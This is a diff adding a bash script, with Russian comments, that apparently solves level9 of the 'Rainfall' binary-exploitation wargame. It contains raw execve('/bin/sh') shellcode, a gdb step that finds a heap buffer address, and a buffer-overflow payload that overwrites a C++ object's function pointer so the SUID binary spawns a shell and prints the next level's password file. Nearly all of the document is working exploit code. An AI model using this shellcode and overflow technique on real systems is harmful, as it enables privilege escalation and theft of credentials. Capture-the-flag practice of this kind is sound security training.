@@ -1,0 +1,29 @@
+# 1. Запустить программу в дебаггере
+# 2. Найти функцию main и класс N и его методы (!c++filt _ZN1NC2Ei)
+# 3. Найти вызов метода N::setAnnotation с вызовом memcpy, копирующий аргумент программы в аттрибут класса
+# 4. Найти адрес, который возвращает malloc внутри memcpy
+# 5. Взять шелл-код для запуска шелла (http://shell-storm.org/shellcode/files/shellcode-211.php)
+# 6. Создать строку с шелл-кодом с адресом выделенной memcpy памяти
+# 7. Поскольку в main вызывается функция по адресу eax, в него нужно записать адрес шелл-кода, скопированного memcpy
+# 8. Запустить программу с этой строкой и получить пароль
+
+ssh level9@"$RAINFALL_IP" -p 4242 '
+    # шелл-код вызова execv("/bin/sh", NULL, NULL)
+    SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
+    SHELLCODE+="\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+    # определение адреса выделяемой памяти
+    BUF_ADDRESS=$(
+        gdb --batch -ex "break _ZN1N13setAnnotationEPc" -ex "run test" -ex "finish" -ex "i reg" ./level9 \
+        | grep eax | awk "{print \$2}"
+    )
+    EXPLOIT_ADDRESS=$(printf "%x" $((BUF_ADDRESS + 4)))
+    BUF_ADDRESS=${BUF_ADDRESS:2:8}
+    # создание нагрузки с переполнением буфера
+    if ((${#BUF_ADDRESS} % 2 == 1)); then BUF_ADDRESS="0${BUF_ADDRESS}"; fi
+    BUF_ADDRESS="\x${BUF_ADDRESS:6:2}\x${BUF_ADDRESS:4:2}\x${BUF_ADDRESS:2:2}\x${BUF_ADDRESS:0:2}"
+    if ((${#EXPLOIT_ADDRESS} % 2 == 1)); then EXPLOIT_ADDRESS="0${EXPLOIT_ADDRESS}"; fi
+    EXPLOIT_ADDRESS="\x${EXPLOIT_ADDRESS:6:2}\x${EXPLOIT_ADDRESS:4:2}\x${EXPLOIT_ADDRESS:2:2}\x${EXPLOIT_ADDRESS:0:2}"
+    python -c "print \"$EXPLOIT_ADDRESS$SHELLCODE\" + \"x\" * 76 + \"$BUF_ADDRESS\"" > /tmp/level9
+    # запуск программы с переполнением
+    (./level9 $(cat /tmp/level9)) <<< "cat /home/user/bonus0/.pass"
+'
